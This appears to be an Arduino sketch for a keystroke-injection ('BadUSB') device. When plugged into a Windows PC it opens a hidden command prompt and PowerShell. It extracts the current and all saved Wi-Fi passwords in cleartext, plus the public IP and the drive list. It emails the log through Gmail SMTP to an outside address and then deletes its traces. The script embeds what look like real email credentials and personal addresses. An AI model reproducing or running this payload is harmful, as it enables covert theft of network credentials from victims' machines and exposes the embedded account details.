

#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload

  delay(2000); //grace delay for recognizing HID device


  // Minimizes all windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(109);
  Keyboard.releaseAll();

  
//Opens Run command box
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();  
  delay(500);   //delay to wait for run to open 

  
//Run Command is Open now Opening CMD
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("mode con:cols=35 lines=15");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  
//CMD had opened time to inject scipt
//First we will change directory
  Keyboard.print("cd \"%USERPROFILE%\\Desktop\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);


 // --> Get SSID
  Keyboard.print("for /f \"tokens=2 delims=: \" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"B\"') do set SSID=%A");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll(); 
  delay(200);

  // --> Get authentication
  Keyboard.print("netsh wlan show profiles %SSID% | findstr \"Authentication\">Temp.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" Temp.txt') do set AUTH=%A");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);

// --> Get key
  Keyboard.print("netsh wlan show profiles %SSID% key=clear | findstr \"Key Content\">Temp.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" Temp.txt') do set KEY=%A");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("echo SSID: %SSID%>>Log.txt & echo Authentication: %AUTH%>>Log.txt & echo Password: %KEY%>>Log.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll(); //Current Wifi Network Appended to log from temp.txt

  // --> Delete Temp.txt
  Keyboard.print("del Temp.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100); //clean up of temp text with currently connected wifi network details
  
  // --> Create Log.txt with Gathered Details
  // This part also grabs Public IP and any other Wireless networks previously connected to
  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec ByPass \"(Invoke-WebRequest -uri 'https://ifconfig.me/ip').Content | Out-File -Encoding Ascii -append Log.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll(); //public IP grabbed
  delay(100);
  
  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Add-Content Log.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll(); // Wifi Networks
  delay(100);
  
  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"gdr -PSProvider 'FileSystem' | Out-File -Encoding Ascii -append Log.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500); //grace delay in case the pc sucks


  //Exfiltrate Data To email
  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('northsidepcit@gmail.com', 'Bankai2018'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'northsidepcit@gmail.com'; $ReportEmail.To.Add('oskargjerlevpetersen@gmail.com'); $ReportEmail.Subject = 'WiFi Report'; $ReportEmail.Body = 'Attached is your WiFi report.'; $ReportEmail.Attachments.Add('Log.txt'); $SMTPInfo.Send($ReportEmail)");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  // --> Delete Log.txt and exit

  Keyboard.print("del Log.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  //restore windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(109);
  Keyboard.releaseAll();
}


void loop() {}
  
